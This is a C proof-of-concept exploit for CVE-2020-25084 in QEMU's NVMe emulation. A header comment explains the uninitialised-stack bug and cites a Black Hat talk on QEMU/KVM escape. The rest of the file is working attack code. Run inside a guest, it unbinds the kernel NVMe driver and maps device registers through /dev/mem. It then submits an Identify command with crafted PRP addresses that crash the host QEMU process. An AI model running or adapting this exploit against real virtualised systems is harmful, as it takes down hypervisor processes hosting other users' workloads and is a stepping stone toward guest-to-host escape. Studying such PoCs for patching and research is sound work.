/*
 * CVE-2020-25084 "Scavenger" Crash PoC
 * NVMe Controller Memory Buffer path → qemu_sglist_destroy on uninitialized stack
 *
 * Affected: QEMU 5.x  (hw/block/nvme.c, dma-helpers.c)
 *
 * Vulnerability:
 *   nvme_dma_read_prp() declares a QEMUSGList on the stack (uninitialised) and
 *   passes its address to nvme_map_prp().  Inside nvme_map_prp(), if prp1 falls
 *   in the NVMe Controller Memory Buffer (CMB) range, the code sets qsg->nsg=0
 *   and takes the iov path WITHOUT calling qemu_sglist_init().  qsg->dev and
 *   qsg->sg remain as uninitialized stack garbage.  If the subsequent prp2
 *   check fails (prp2==0), the code jumps to 'unmap:' which calls
 *   qemu_sglist_destroy(qsg) → object_unref(garbage qsg->dev) → SIGSEGV.
 *
 * Attack:
 *   1. Locate NVMe PCI device via sysfs (class 0x010802).
 *   2. Unbind kernel nvme driver to take exclusive MMIO access.
 *   3. Map BAR0 (NVMe registers) via /dev/mem.
 *   4. Set up Admin SQ/CQ in locked guest memory, initialise NVMe controller.
 *   5. Issue an Identify Controller admin command with:
 *        prp1 = BAR2_CMB_base + 0x500  (in CMB range, not page-aligned)
 *        prp2 = 0                       (invalid → !prp2 → goto unmap)
 *      → nvme_map_prp: takes CMB branch (qsg->dev stays as stack junk)
 *      → !prp2 → goto unmap → qemu_sglist_destroy(uninit stack qsg)
 *      → object_unref(garbage ptr) → SIGSEGV in QEMU host
 *
 * References:
 *   [Black Hat Asia 2021] Scavenger: Misuse Error Handling Leading to QEMU/KVM Escape
 *   https://mp.weixin.qq.com/s/1KYTZynabBqzNjoJhe1bWw
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <dirent.h>
#include <sys/mman.h>
#include <sys/types.h>

/* ================================================================== */
/* NVMe constants                                                       */
/* ================================================================== */
#define NVME_PCI_CLASS      0x010802u   /* Mass storage / NVM Express   */
#define NVME_BAR0_SIZE      0x2000u     /* Admin register space (8 KB)  */

/* NVMe register offsets (from BAR0) */
#define NVME_CAP            0x00u       /* Controller Capabilities (8B) */
#define NVME_CC             0x14u       /* Controller Configuration     */
#define NVME_CSTS           0x1Cu       /* Controller Status            */
#define NVME_AQA            0x24u       /* Admin Queue Attributes       */
#define NVME_ASQ            0x28u       /* Admin SQ Base Address (8B)   */
#define NVME_ACQ            0x30u       /* Admin CQ Base Address (8B)   */
#define NVME_DB_BASE        0x1000u     /* First doorbell               */

/* CC fields */
#define NVME_CC_EN          (1u << 0)
#define NVME_CC_CSS_NVM     (0u << 4)
#define NVME_CC_MPS_4K      (0u << 7)
#define NVME_CC_AMS_RR      (0u << 11)
#define NVME_CC_SHN_NONE    (0u << 14)
#define NVME_CC_IOSQES      (6u << 16)  /* SQE = 2^6 = 64 bytes         */
#define NVME_CC_IOCQES      (4u << 20)  /* CQE = 2^4 = 16 bytes         */
#define NVME_CC_START       (NVME_CC_CSS_NVM | NVME_CC_MPS_4K | \
                             NVME_CC_AMS_RR  | NVME_CC_SHN_NONE | \
                             NVME_CC_IOSQES  | NVME_CC_IOCQES   | \
                             NVME_CC_EN)

/* CSTS fields */
#define NVME_CSTS_RDY       (1u << 0)
#define NVME_CSTS_CFS       (1u << 1)

/* Admin queue depth (must fit MQES; 4 entries is plenty) */
#define AQ_DEPTH            4u

/* NVMe admin opcodes */
#define NVME_ADM_IDENTIFY   0x06u

/* Identify CNS values */
#define NVME_CNS_CTRL       0x01u       /* Controller data structure    */

/* ================================================================== */
/* Types                                                                */
/* ================================================================== */
/* Submission Queue Entry (64 bytes) */
typedef struct __attribute__((packed)) {
    uint8_t  opcode;
    uint8_t  fuse_psdt;
    uint16_t cid;
    uint32_t nsid;
    uint64_t res;
    uint64_t mptr;
    uint64_t prp1;
    uint64_t prp2;
    uint32_t cdw10;
    uint32_t cdw11;
    uint32_t cdw12;
    uint32_t cdw13;
    uint32_t cdw14;
    uint32_t cdw15;
} NvmeSqe;

/* Completion Queue Entry (16 bytes) */
typedef struct __attribute__((packed)) {
    uint32_t dw0;
    uint32_t dw1;
    uint16_t sq_head;
    uint16_t sq_id;
    uint16_t cid;
    uint16_t status;        /* bit 0 = phase tag, [15:1] = SC/SCT */
} NvmeCqe;

/* ================================================================== */
/* Helpers: pagemap / /dev/mem                                          */
/* ================================================================== */
#define PAGE_SHIFT  12
#define PAGE_SIZE   (1UL << PAGE_SHIFT)
#define PFN_PRESENT (1ULL << 63)
#define PFN_MASK    ((1ULL << 55) - 1)

static uint64_t gva_to_gpa(void *addr)
{
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) { perror("pagemap"); exit(1); }
    uint64_t pme = 0;
    off_t off = ((uintptr_t)addr >> PAGE_SHIFT) * 8;
    lseek(fd, off, SEEK_SET);
    if (read(fd, &pme, 8) != 8) { perror("pagemap read"); exit(1); }
    close(fd);
    if (!(pme & PFN_PRESENT)) {
        fprintf(stderr, "[-] Page not present for %p\n", addr); exit(1);
    }
    return ((pme & PFN_MASK) << PAGE_SHIFT) | ((uintptr_t)addr & (PAGE_SIZE - 1));
}

static volatile uint8_t *mmio_map(uint64_t phys, size_t size)
{
    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd < 0) { perror("/dev/mem"); exit(1); }
    void *p = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, (off_t)phys);
    close(fd);
    if (p == MAP_FAILED) { perror("mmap"); exit(1); }
    return (volatile uint8_t *)p;
}

/* ================================================================== */
/* NVMe MMIO register read/write                                        */
/* ================================================================== */
#define NVME_RD32(b, r)    (*(volatile uint32_t *)((b) + (r)))
#define NVME_WR32(b, r, v) (*(volatile uint32_t *)((b) + (r)) = (v))

static uint64_t nvme_rd64(volatile uint8_t *b, uint32_t r)
{
    return (uint64_t)NVME_RD32(b, r) | ((uint64_t)NVME_RD32(b, r + 4) << 32);
}
static void nvme_wr64(volatile uint8_t *b, uint32_t r, uint64_t v)
{
    NVME_WR32(b, r,      (uint32_t)(v & 0xffffffffUL));
    NVME_WR32(b, r + 4,  (uint32_t)(v >> 32));
}

/* ================================================================== */
/* PCI sysfs: find NVMe device, return BAR0 and BAR2 physical addrs    */
/* ================================================================== */
static uint64_t find_nvme_bars(uint64_t *bar2_out, char devname[64])
{
    const char *syspci = "/sys/bus/pci/devices";
    DIR *d = opendir(syspci);
    if (!d) { perror("opendir /sys/bus/pci/devices"); exit(1); }

    struct dirent *e;
    while ((e = readdir(d)) != NULL) {
        if (e->d_name[0] == '.') continue;

        /* Check class code */
        char path[320];
        snprintf(path, sizeof(path), "%s/%s/class", syspci, e->d_name);
        FILE *f = fopen(path, "r");
        if (!f) continue;
        uint32_t cls = 0;
        fscanf(f, "%x", &cls);
        fclose(f);
        if (cls != NVME_PCI_CLASS) continue;

        /* Read resource file: lines 0-2 give BAR0, BAR0-hi, BAR2 */
        snprintf(path, sizeof(path), "%s/%s/resource", syspci, e->d_name);
        f = fopen(path, "r");
        if (!f) continue;
        uint64_t bars[3][3];
        memset(bars, 0, sizeof(bars));
        for (int i = 0; i < 3; i++)
            fscanf(f, "0x%lx 0x%lx 0x%lx\n",
                   &bars[i][0], &bars[i][1], &bars[i][2]);
        fclose(f);

        printf("[+] NVMe: %s  BAR0=0x%lx  BAR2=0x%lx\n",
               e->d_name, bars[0][0], bars[2][0]);
        strncpy(devname, e->d_name, 63);
        closedir(d);
        *bar2_out = bars[2][0];
        return bars[0][0];
    }
    closedir(d);
    fprintf(stderr, "[-] NVMe controller not found in sysfs\n");
    exit(1);
}

/* ================================================================== */
/* Unbind kernel nvme driver                                            */
/* ================================================================== */
static void unbind_nvme(const char *bdf)
{
    const char *unbind = "/sys/bus/pci/drivers/nvme/unbind";
    FILE *f = fopen(unbind, "w");
    if (!f) {
        fprintf(stderr, "[!] Cannot unbind nvme driver (%s) — continuing\n",
                strerror(errno));
        return;
    }
    fputs(bdf, f);
    fclose(f);
    usleep(200000);
    printf("[+] Unbound nvme driver from %s\n", bdf);
}

/* ================================================================== */
/* main                                                                 */
/* ================================================================== */
int main(void)
{
    printf("[*] CVE-2020-25084 — NVMe qemu_sglist_destroy uninitialized stack PoC\n\n");

    /* ---------------------------------------------------------------- */
    /* 1.  Find NVMe PCI device via sysfs                               */
    /* ---------------------------------------------------------------- */
    char devname[64] = {0};
    uint64_t bar2_phys = 0;
    uint64_t bar0_phys = find_nvme_bars(&bar2_phys, devname);

    if (!bar2_phys) {
        fprintf(stderr, "[-] CMB BAR2 is zero — is cmb_size_mb=64 set in QEMU args?\n");
        exit(1);
    }

    /* ---------------------------------------------------------------- */
    /* 2.  Unbind kernel nvme driver                                     */
    /* ---------------------------------------------------------------- */
    unbind_nvme(devname);

    /* ---------------------------------------------------------------- */
    /* 3.  Map BAR0 (NVMe registers)                                    */
    /* ---------------------------------------------------------------- */
    volatile uint8_t *nvme = mmio_map(bar0_phys, NVME_BAR0_SIZE);
    printf("[+] BAR0 mapped @ %p (phys 0x%lx)\n", (void *)nvme, bar0_phys);

    uint64_t cap = nvme_rd64(nvme, NVME_CAP);
    uint8_t  dstrd = (cap >> 32) & 0xf;  /* doorbell stride */
    printf("[+] CAP=0x%016lx  DSTRD=%u\n", cap, dstrd);
    printf("[+] CMB BAR2=0x%lx  (trigger prp1=0x%lx)\n",
           bar2_phys, bar2_phys + 0x500);

    /* ---------------------------------------------------------------- */
    /* 4.  Allocate + lock Admin SQ and CQ pages                        */
    /* ---------------------------------------------------------------- */
    /* Page 0: Admin SQ — AQ_DEPTH × 64 bytes of SQEs                  */
    /* Page 1: Admin CQ — AQ_DEPTH × 16 bytes of CQEs                  */
    void *mem = mmap(NULL, PAGE_SIZE * 2,
                     PROT_READ | PROT_WRITE,
                     MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { perror("mmap pages"); exit(1); }
    mlock(mem, PAGE_SIZE * 2);
    memset(mem, 0, PAGE_SIZE * 2);          /* force pages into RAM     */

    void *asq_va = mem;
    void *acq_va = (uint8_t *)mem + PAGE_SIZE;
    uint64_t asq_pa = gva_to_gpa(asq_va);
    uint64_t acq_pa = gva_to_gpa(acq_va);
    printf("[+] ASQ va=%p pa=0x%lx\n", asq_va, asq_pa);
    printf("[+] ACQ va=%p pa=0x%lx\n", acq_va, acq_pa);

    /* ---------------------------------------------------------------- */
    /* 5.  Initialise NVMe controller                                   */
    /* ---------------------------------------------------------------- */
    /* 5a.  Disable controller and wait for CSTS.RDY=0 */
    uint32_t cc = NVME_RD32(nvme, NVME_CC);
    if (cc & NVME_CC_EN) {
        NVME_WR32(nvme, NVME_CC, cc & ~NVME_CC_EN);
        int t = 5000;
        while ((NVME_RD32(nvme, NVME_CSTS) & NVME_CSTS_RDY) && --t)
            usleep(1000);
        if (!t) { fprintf(stderr, "[-] Timeout disabling controller\n"); exit(1); }
        printf("[+] Controller disabled (CSTS=0x%08x)\n",
               NVME_RD32(nvme, NVME_CSTS));
    }

    /* 5b.  Program Admin Queue Attributes + base addresses */
    NVME_WR32(nvme, NVME_AQA,
              ((AQ_DEPTH - 1) << 16) | (AQ_DEPTH - 1));   /* ACQS | ASQS */
    nvme_wr64(nvme, NVME_ASQ, asq_pa);
    nvme_wr64(nvme, NVME_ACQ, acq_pa);

    /* 5c.  Enable controller and wait for CSTS.RDY=1 */
    NVME_WR32(nvme, NVME_CC, NVME_CC_START);
    printf("[*] Waiting for CSTS.RDY...\n");
    int t = 5000;
    while (!(NVME_RD32(nvme, NVME_CSTS) & NVME_CSTS_RDY) && --t)
        usleep(1000);
    if (!t) { fprintf(stderr, "[-] Controller never became ready\n"); exit(1); }
    printf("[+] Controller ready  (CSTS=0x%08x)\n",
           NVME_RD32(nvme, NVME_CSTS));

    /* ---------------------------------------------------------------- */
    /* 6.  Build Identify Controller SQE with poison PRPs               */
    /*                                                                  */
    /*  prp1 = bar2_phys + 0x500:                                       */
    /*    • In CMB range → nvme_map_prp takes CMB branch                */
    /*    • Sets qsg->nsg=0 but leaves qsg->dev as uninitialized stack  */
    /*    • 0x500 offset → trans_len = 0x1000-0x500 = 0xb00 < 4096     */
    /*      so len is not consumed in one shot → prp2 check runs        */
    /*  prp2 = 0:                                                       */
    /*    • !prp2 → goto unmap → qemu_sglist_destroy(uninit stack qsg)  */
    /*    • object_unref(garbage qsg->dev) → SIGSEGV in QEMU host       */
    /* ---------------------------------------------------------------- */
    uint64_t cmb_prp1 = bar2_phys + 0x500;   /* inside CMB, not page-aligned */

    NvmeSqe *sqe = (NvmeSqe *)asq_va;
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode  = NVME_ADM_IDENTIFY;
    sqe->cid     = 1;
    sqe->nsid    = 0;
    sqe->prp1    = cmb_prp1;    /* CMB range → uninitialized qsg->dev  */
    sqe->prp2    = 0;           /* → !prp2 → goto unmap → crash        */
    sqe->cdw10   = NVME_CNS_CTRL;

    printf("\n[*] Submitting Identify Controller:\n");
    printf("      PRP1 = 0x%lx  (CMB range, non-page-aligned)\n", cmb_prp1);
    printf("      PRP2 = 0x0    (triggers !prp2 → goto unmap)\n");
    printf("[*] nvme_map_prp CMB branch → qsg->dev = stack garbage\n");
    printf("[*] goto unmap → qemu_sglist_destroy(uninit qsg) → SIGSEGV expected\n\n");

    /* ---------------------------------------------------------------- */
    /* 7.  Ring SQ0 tail doorbell (submit 1 command: tail = 1)          */
    /* ---------------------------------------------------------------- */
    uint32_t db_off = NVME_DB_BASE + (0 * 2 * (4u << dstrd));  /* SQ0 tail */
    NVME_WR32(nvme, db_off, 1);

    printf("[*] Doorbell rung.  Waiting for QEMU crash…\n");
    sleep(2);

    printf("[-] No crash detected — check /proc/iomem or dmesg\n");
    return 0;
}
